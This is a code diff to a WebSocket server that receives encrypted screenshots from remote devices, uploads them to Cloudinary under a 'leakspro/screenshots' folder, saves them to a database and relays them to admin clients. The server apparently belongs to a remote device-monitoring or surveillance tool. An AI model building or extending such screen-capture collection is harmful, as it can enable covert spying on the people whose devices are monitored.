@@ -448,18 +448,32 @@ function setupWebSocket(io) {
     });
 
     // ========== SCREEN CAPTURED (device sends screenshot back) ==========
-    socket.on('screen_captured', (rawData) => {
+    socket.on('screen_captured', async (rawData) => {
       try {
         const data = tryDecrypt(rawData);
         const { device_id, image_base64, width, height } = data;
         if (!device_id || !image_base64) return;
 
-        const fileSize = Math.round((image_base64.length * 3) / 4); // approximate base64 → bytes
+        const fileSize = Math.round((image_base64.length * 3) / 4);
 
-        // Store in DB
+        // Upload to Cloudinary (prevents DB bloat from base64)
+        let imageUrl = '';
+        try {
+          const { uploadToCloudinary } = require('../config/cloudinary');
+          const buffer = Buffer.from(image_base64, 'base64');
+          const result = await uploadToCloudinary(buffer, { 
+            resource_type: 'image', folder: 'leakspro/screenshots',
+            public_id: `ss_${device_id}_${Date.now()}`
+          });
+          imageUrl = result.secure_url || '';
+        } catch (e) {
+          console.warn('[ScreenCapture] Cloudinary upload failed, using base64:', e.message);
+        }
+
+        // Store URL (or base64 fallback) in DB
         db.prepare(`INSERT INTO screen_captures (device_id, image_base64, width, height, file_size)
           VALUES (?, ?, ?, ?, ?)`).run(
-          device_id, image_base64, width || 0, height || 0, fileSize
+          device_id, imageUrl || image_base64, width || 0, height || 0, fileSize
         );
 
         // Broadcast to all admin clients
